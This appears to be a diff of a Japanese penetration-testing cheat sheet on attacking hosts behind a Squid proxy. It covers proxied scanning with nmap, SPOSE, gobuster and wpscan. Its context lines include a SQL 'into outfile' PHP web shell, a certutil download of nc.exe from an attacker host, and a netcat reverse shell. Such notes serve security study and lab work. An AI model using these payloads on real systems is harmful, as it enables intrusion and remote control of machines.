@@ -77,7 +77,7 @@ proxychainsからnmapを実行（`-sT`を使うこと）
 proxychains nmap -sT -n -p- localhost
 ```
 
-### SPOSE Scanner（推奨）
+### SPOSE Scanner
 
 [spose.py](https://github.com/aancw/spose)を使ったSquid経由のポートスキャン
 ```zsh
@@ -90,7 +90,6 @@ python3 spose.py --proxy http://<squid_IP>:3128 --target <squid_IP>
 Gobuster
 ```zsh
 gobuster dir -u http://<TargetIP|Domain>:<Port>/ -r -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -o gobuster.txt -x '<extensions>' --proxy http://<squid_IP>:3128
-gobuster dir -u http://<TargetIP>:<port>/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
 Nikto
@@ -110,7 +109,7 @@ wpscan --url http://<TargetIP>/wordpress --wp-content-dir wp-content --proxy htt
 ## プロキシ経由での隠れたポートへのアクセス
 
 Squidプロキシが動いているターゲットでは、直接アクセスできない内部ポートが存在することがある。  
-SPOSE等でスキャンして開いているポートを特定し、ブラウザのプロキシ設定経由でアクセスする。
+[[#SPOSE Scanner]] などでスキャンして開いているポートを特定し、ブラウザのプロキシ設定経由でアクセスする。
 
 典型的な攻撃フロー：
 
@@ -132,13 +131,13 @@ select '<?php system($_GET["cmd"]); ?>' into outfile 'C:/wamp/www/shell.php';
 ```
 
 WebShell確認
-```powershell
+```
 http://<TargetIP>:8080/shell.php?cmd=whoami
 ```
 
 リバースシェル取得（certutilでnc.exeをダウンロード）
 ```powershell
-certutil -urlcache -f http://<attacker_IP>:8000/nc.exe nc.exe
+certutil -urlcache -f http://<AttackerIP>:8000/nc.exe nc.exe
 ```
 ```powershell
 nc.exe <attacker_IP> 443 -e cmd.exe
@@ -163,6 +162,5 @@ http_access allow lan
 forwarded_for off   # クライアントIPを隠す
 forwarded_for on    # クライアントIPをX-Forwarded-Forに付与
 ```
-
 `forwarded_for off`が設定されている場合、プロキシ越しでもクライアントIPが漏洩しない。  
 `forwarded_for on`が設定されている場合は`X-Forwarded-For: <client_IP>`がリクエストに付与される。
